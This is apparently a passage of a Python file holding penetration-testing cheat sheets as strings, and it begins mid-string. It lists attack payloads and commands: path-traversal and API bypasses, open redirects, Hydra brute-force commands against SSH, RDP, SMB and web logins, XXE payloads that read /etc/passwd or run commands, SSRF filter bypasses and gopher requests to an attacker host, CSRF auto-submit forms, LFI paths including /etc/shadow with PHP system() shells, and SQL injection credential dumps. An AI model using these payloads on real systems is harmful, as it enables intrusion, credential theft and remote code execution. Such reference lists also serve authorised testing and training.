?key={payload}
?l={payload}
?begindate={payload}
?enddate={payload}
'''

api_endpoint_bypass = '''                           		 		  	    					      𝗔𝗣𝗜 𝗲𝗻𝗱𝗽𝗼𝗶𝗻𝘁 𝗯𝘆𝗽𝗮𝘀𝘀 𝗰𝗵𝗲𝗮𝘁𝘀𝗵𝗲𝗲𝘁
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[𝗣𝗮𝘆𝗹𝗼𝗮𝗱𝘀 𝗳𝗼𝗿 𝗯𝗮𝘀𝗶𝗰 𝘁𝗲𝘀𝘁]

?
??
&
#
%
%20
%09
/
/..;/
../
..%2f
..;/
\\..\\.\\
.././
..%00/
..%0d/
..%5c
..\\
..%ff/
%2e%2e%2f
.%2e/
%3f
%26
%23
.json
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗛𝗧𝗧𝗣 𝗵𝗲𝗮𝗱𝗲𝗿 𝗯𝗮𝘀𝗲𝗱 𝗯𝘆𝗽𝗮𝘀𝘀 ]

1. X-Original-URL: /redact
2. Referer: https://example.com/api/redact

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''


open_redirect = '''                           		 		  	    					      𝗢𝗽𝗲𝗻 𝘄𝗲𝗯 𝗿𝗲𝗱𝗶𝗿𝗲𝗰𝘁
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗢𝗽𝗲𝗻 𝘄𝗲𝗯 𝗿𝗲𝗱𝗶𝗿𝗲𝗰𝘁 𝗰𝗼𝗺𝗺𝗼𝗻 𝗽𝗮𝘆𝗹𝗼𝗮𝗱𝘀 ]
/%09/example.com
/%2f%2fexample.com
/%2f%2f%2fbing.com%2f%3fwww.omise.co
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cexample.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
////%5cexample.com
/////example.com
/////example.com/
////\\;@example.com
////example.com/
////example.com/%2e%2e
////example.com/%2e%2e%2f
////example.com/%2f%2e%2e
////example.com/%2f..
////example.com//
///\\;@example.com
///example.com
///example.com/
//google.com/%2f..
//www.whitelisteddomain.tld@google.com/%2f..
///google.com/%2f..
///www.whitelisteddomain.tld@google.com/%2f..
////google.com/%2f..
////www.whitelisteddomain.tld@google.com/%2f..
https://google.com/%2f..
https://www.whitelisteddomain.tld@google.com/%2f..
/https://google.com/%2f..
/https://www.whitelisteddomain.tld@google.com/%2f..
//www.google.com/%2f%2e%2e
//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
///www.google.com/%2f%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
////www.google.com/%2f%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''


hydra = '''                           		 		  	    					      			𝗛𝘆𝗱𝗿𝗮 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 𝗖𝗿𝗮𝗰𝗸𝗶𝗻𝗴 𝗖𝗵𝗲𝗲𝘁𝘀𝗵𝗲𝗲𝘁
Command															 	 Description
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -P password-file.txt -v $ip snmp 																 Hydra brute force against SNMP
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp	                                                             Hydra FTP known user and rockyou password list
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh	                                           															 Hydra SSH using list of users and passwords
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh	                                           															 Hydra SSH using a known password and a username list
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt	                                                                               Hydra SSH Against Known username on port 22
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V	                                                      										Hydra POP3 Brute Force
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V	                                                      															 Hydra SMTP Brute Force
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin	                                                                       Hydra attack http get 401 login with a dictionary
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip	                                                 Hydra attack Windows Remote Desktop with rockyou
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb	                          															 Hydra brute force SMB user with rockyou:
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-form-post "/login.php:username=^USER^&password=^PASS^:Invalid Username"	 Hydra brute force a Wordpress admin login
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -L usernames.txt -P passwords.txt $ip smb -V -f	                                                                           SMB Brute Forcing
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
hydra -L users.txt -P passwords.txt $ip ldap2 -V -f	                                                                             LDAP Brute Forcing
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

xxe = '''                           		 		  	    					      			𝗫𝗠𝗟 𝗘𝘅𝘁𝗲𝗿𝗻𝗮𝗹 𝗘𝗻𝘁𝗶𝘁𝘆 (𝗫𝗫𝗘)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗫𝗫𝗘: 𝗿𝗲𝗮𝗱 𝗹𝗼𝗰𝗮𝗹 𝗳𝗶𝗹𝗲𝘀 (𝗹𝗶𝗻𝘂𝘅) ]

<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

[ 𝗫𝗫𝗘: 𝗿𝗲𝗮𝗱 𝗹𝗼𝗰𝗮𝗹 𝗳𝗶𝗹𝗲𝘀 (𝗹𝗶𝗻𝘂𝘅) ]

 <?xml version = "1.0"?>
 <!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///windows/win.ini"> ]>
<order>
 <quantity>1</quantity>
 <item>
&exploit;
</item>
 <address>USA</address>
 </order>

[ If the output of the win.ini file on the target returns the response message, then it proves that the XML External Entity vulnerability is present. ]

[ use replace funtion if case sensitive ]

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&exploit;</lastName>
</userInfo>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗫𝗫𝗘 𝘁𝗼 𝗥𝗖𝗘 ]

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY exploit SYSTEM "expect://id"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&exploit;</lastName>
</userInfo>
XXE to SSRF
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗫𝗫𝗘 𝗶𝗻𝘀𝗶𝗱𝗲 𝗦𝗩𝗚 - 𝗥𝗖𝗘 ]

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://id"></image>
</svg>

[ 𝗫𝗫𝗘 𝗶𝗻𝘀𝗶𝗱𝗲 𝗦𝗩𝗚 - 𝗟𝗙𝗜 ]

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

xxe_protocols = '''                           		 		  	    					      			𝗫𝗫𝗘 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝗮𝗯𝗹𝗲 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹𝘀
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
File: could be used to read local file on the server

file:///etc/passwd
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
HTTP(s): useful in OOB Data Exfiltration

http(s)://securityidiots.com/lol.xml
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
FTP: useful in OOB Data Exfiltration & hitting the internal FTP service which is behind NAT

ftp://securityidiots.com/lol.xml
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SFTP: hitting the internal SFTP service which is behind NAT

sftp://securityidiots.com:11111/
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
TFTP: hitting the internal TFTP service which is behind NAT

tftp://securityidiots.com:12346/lol.xml
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
DICT : could also be used to make requests to internal services

dict://ip:22/_XXX
dict://ip:6379/_XXX
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
NETDOC: This could be used as an alternative to file in JAVA based Servers.

netdoc:/etc/passwd
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
LDAP: could be used to query internal LDAP Service.

ldap://localhost:11211/%0astats%0aquit
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
GOPHER:

gopher://<host>:<port>/_<gopher-path>
gopher://<host>:25/%0AHELO ... (executing commands on internal SMTP Service)

[ Making internal HTTP Requests(GET,POST..etc) ]

gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A

gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PHP: if PHP is installed we can use PHP Wrappers to read PHP source codes as Base64 content.

php://filter/convert.base64-encode/resource=index.php
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Data:

data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

ssrf = '''                           		 		  	    					      			𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝗶𝗱𝗲 𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗙𝗼𝗿𝗴𝗲𝗿𝘆 (𝗦𝗦𝗥𝗙) 

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗽𝗮𝘆𝗹𝗼𝗮𝗱𝘀 𝗳𝗼𝗿 𝗱𝗶𝗳𝗳𝗲𝗿𝗲𝗻𝘁 𝗺𝗲𝘁𝗵𝗼𝗱𝘀 ]
file://path/to/file

dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>

dict://127.0.0.1:1337/stats

ftp://127.0.0.1/

sftp://attacker-website.com:1337/

tftp://attacker-website.com:1337/TESTUDPPACKET

ldap://127.0.0.1:389/%0astats%0aquit

ldaps://127.0.0.1:389/%0astats%0aquit

ldapi://127.0.0.1:389/%0astats%0aquit

gopher://attacker-website.com/_SSRF%0ATest!
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗜𝗣 𝗮𝗱𝗱𝗿𝗲𝘀𝘀 𝗳𝗼𝗿𝗺𝗮𝘁𝘀 ]

[ You can try using a different IP address format to bypass the filter ]

[ 𝗥𝗮𝗿𝗲 𝗜𝗣 𝗮𝗱𝗱𝗿𝗲𝘀𝘀 𝗳𝗼𝗿𝗺𝗮𝘁𝘀, 𝗱𝗲𝗳𝗶𝗻𝗲𝗱 𝗶𝗻 𝗥𝗙𝗖 𝟯𝟵𝟴𝟲 ] 

* Dotted hexadecimal IP: 0x7f.0x0.0x0.0x1
* Dotless hexadecimal IP: 0x7f001
* Dotless hexadecimal IP with padding: 0x0a0b0c0d7f000001 (padding is 0a0b0c0d)
* Dotless decimal IP: 2130706433
* Dotted decimal IP with overflow (256): 383.256.256.257
* Dotted octal IP: 0177.0.0.01
* Dotless octal IP: 017700000001
* Dotted octal IP with padding: 00177.000.0000.000001


[ 𝗖𝗼𝗺𝗯𝗶𝗻𝗲𝗱 ]
0x7f.0.1
0x7f.1
00177.1
00177.0x0.1

[ 𝗬𝗼𝘂 𝗰𝗮𝗻 𝘀𝗵𝗼𝗿𝘁-𝗵𝗮𝗻𝗱 𝗜𝗣 𝗮𝗱𝗱𝗿𝗲𝘀𝘀𝗲𝘀 𝗯𝘆 𝗱𝗿𝗼𝗽𝗽𝗶𝗻𝗴 𝘁𝗵𝗲 𝘇𝗲𝗿𝗼𝘀 ]
1 part  (ping A)       : 0.0.0.A
2 parts (ping A.B)     : A.0.0.B
3 parts (ping A.B.C)   : A.B.0.C
4 parts (ping A.B.C.D) : A.B.C.D

0       => 0.0.0.0
127.1   => 127.0.0.1
127.0.1 => 127.0.0.1


[ 𝗜𝗣𝘃𝟲 𝗹𝗼𝗰𝗮𝗹𝗵𝗼𝘀𝘁 ]
[::]
0000::1
[::1]
0:0:0:0:0:0:0:0
IPv4-mapped IPv6 address: [::ffff:7f00:1]
IPv4-mapped IPv6 address: [::ffff:127.0.0.1]
IPv4-compatible IPv6 address (deprecated, q.v. RFC4291: [::127.0.0.1]
IPv4-mapped IPv6 address with zone identifier: [::ffff:7f00:1%25]
IPv4-mapped IPv6 address with zone identifier: [::ffff:127.0.0.1%eth0]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

csrf = '''                           		 		  	    					      			𝗖𝗿𝗼𝘀𝘀 𝗦𝗶𝘁𝗲 𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗙𝗼𝗿𝗴𝗲𝗿𝘆 (𝗖𝗦𝗥𝗙)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗢𝗻 𝗰𝗹𝗶𝗰𝗸 𝘀𝘂𝗯𝗺𝗶𝘁 - 𝗛𝗧𝗠𝗟 𝗚𝗘𝗧 ]

<a href="http://www.example.com/api/setusername?username=CSRF">Click Me</a>

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗔𝘂𝘁𝗼 𝘀𝘂𝗯𝗺𝗶𝘁 - 𝗛𝗧𝗠𝗟 𝗚𝗘𝗧 ]
<img src="http://www.example.com/api/setusername?username=CSRF">

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗢𝗻 𝗰𝗹𝗶𝗰𝗸 𝘀𝘂𝗯𝗺𝗶𝘁 - 𝗛𝗧𝗠𝗟 𝗣𝗢𝗦𝗧 ]

<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRF" />
 <input type="submit" value="Submit Request" />
</form>

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗔𝘂𝘁𝗼 𝘀𝘂𝗯𝗺𝗶𝘁 - 𝗛𝗧𝗠𝗟 𝗣𝗢𝗦𝗧 ]
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

𝗝𝗦𝗢𝗡 𝗚𝗘𝗧
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

𝗝𝗦𝗢𝗡 𝗣𝗢𝗦𝗧
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

lfi = '''                           		 		  	    					      			𝗟𝗼𝗰𝗮𝗹 𝗳𝗶𝗹𝗲 𝗶𝗻𝗰𝗹𝘂𝘀𝗶𝗼𝗻 (𝗟𝗙𝗜)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗣𝗮𝘆𝗹𝗼𝗮𝗱𝘀 ]

../../../../../../etc/passwd
....//....//....//....//....//etc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8etc/passwd
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗪𝗲 𝗰𝗮𝗻 𝗮𝗹𝘀𝗼 𝗰𝗵𝗲𝗰𝗸 𝘁𝗵𝗼𝘀𝗲 𝗽𝗮𝘁𝗵 ]

/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/var/log/apache2/access.log
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-enabled/<site-from-000-df-comment>
/var/www/wordpress/wp-config.php
/etc/nginx/nginx.conf
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗠𝗼𝗿𝗲 𝘂𝘀𝗲𝗳𝘂𝗹 𝘁𝗲𝗰𝗵𝗻𝗶𝗾𝘂𝗲𝘀 ]

akech.com/index.php?token=/etc/passwd%00

akrech.com/index.php?page=../../../../../../etc/passwd%00

http://www.test.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls

http://www.test.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls

http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

mysql = '''                           		 		  	    					      			𝗠𝘆𝗦𝗤𝗟 𝗰𝗵𝗲𝗮𝘁𝘀𝗵𝗲𝗲𝘁
Command											  							Description
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
mysql -u root -h examle.com -P 3306 -p														 			login to mysql database
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SHOW DATABASES												 					List available databases
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
USE users										  							Switch to database	
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
CREATE TABLE logins (id INT, ...)		  															Add a new table
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SHOW TABLES										  							List available tables in current database
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
DESCRIBE logins								  									Show table properties and columns
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
INSERT INTO table_name VALUES (value_1,..)		 															Add values to table
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)																	Add values to specific columns in a table
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>																	Update table values
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT * FROM table_name		 															Show all columns in a table
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT column1, column2 FROM table_name		 															Show specific columns in a table
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
DROP TABLE logins		 															Delete a table
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ALTER TABLE logins ADD newColumn INT		 															Add new column
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn		 															Rename column
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ALTER TABLE logins MODIFY oldColumn DATE		 															Change column datatype
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ALTER TABLE logins DROP oldColumn		 															Delete column	
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT * FROM logins ORDER BY column_1		 															Sort by column
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT * FROM logins ORDER BY column_1 DESC		 															Sort by column in descending order
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT * FROM logins ORDER BY column_1 DESC, id ASC		 															Sort by two-columns
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT * FROM logins LIMIT 2		 															Only show first two results
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT * FROM logins LIMIT 1, 2		 															Only show first two results starting from index 2
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT * FROM table_name WHERE <condition>		 															List results that meet a condition
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT * FROM logins WHERE username LIKE 'admin%'		 															List results where the name is similar to a given string
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗠𝘆𝗦𝗤𝗟 𝗢𝗽𝗲𝗿𝗮𝘁𝗼𝗿 𝗣𝗿𝗲𝗰𝗲𝗱𝗲𝗻𝗰𝗲 ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Division (/), Multiplication (*), and Modulus (%)

Addition (+) and Subtraction (-)

Comparison (=, >, <, <=, >=, !=, LIKE)

NOT (!)

AND (&&)

OR (||)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''


sqli = '''
SQL Injection
Payload 	Description
Auth Bypass
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 	
admin' or '1'='1 	Basic Auth Bypass
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
admin')-- - 	Basic Auth Bypass With comments
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 	
Union Injection
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 	
' order by 1-- - 	Detect number of columns using order by
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' UNION select 1,2,3-- - 	Detect number of columns using Union injection
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' UNION select 1,@@version,3,4-- - 	Basic Union injection
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
UNION select username, 2, 3, 4 from passwords-- - 	Union injection for 4 columns
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
DB Enumeration
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 	
SELECT @@version 	Fingerprint MySQL with query output
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
SELECT SLEEP(5) 	Fingerprint MySQL with no output
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' UNION select 1,database(),2,3-- - 	Current database name
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 	List all databases
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - 	List all tables in a specific database
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - 	List all columns in a specific table
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' UNION select 1, username, password, 4 from dev.credentials-- - 	Dump data from a table in another database
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Privileges
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 	
cn' UNION SELECT 1, user(), 3, 4-- - 	Find current user
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - 	Find if user has admin privileges
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
